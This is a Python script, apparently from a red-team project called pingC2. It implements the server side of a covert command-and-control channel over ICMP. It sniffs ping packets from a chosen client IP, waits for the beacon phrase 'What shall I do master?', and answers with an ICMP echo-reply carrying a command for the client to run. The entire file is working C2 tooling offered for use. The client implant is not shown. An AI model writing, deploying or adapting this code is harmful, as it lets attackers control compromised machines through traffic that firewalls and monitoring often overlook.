#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

import sys
from scapy.all import *

def main(argv):
	if len(argv) < 2:
                print "----------------------------"
                print "PingC2 Usage"
                print " ./pingc2.py <client IP> <command>"
                print "----------------------------"
                exit()
	
	conf.verb = 0
	host = sys.argv[1]
	count = 1
	filter = "icmp and host " + host
	print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))

	while 1:
		packet = sniff(count,filter=filter)
		for p in packet:
			p.show2()
			request = p['Raw'].load
			checksum = p['ICMP'].chksum
			print "[*] Request checksum: (%s)" % checksum
			print "[*] Request: " + request
			if request == 'What shall I do master?':
				resp = IP(dst=host)/ICMP(type="echo-reply")/sys.argv[2]
				print "[*] Response sent: " + sys.argv[2]
				resp.show2()
				send(resp)

if __name__ == "__main__":
   main(sys.argv[1:])
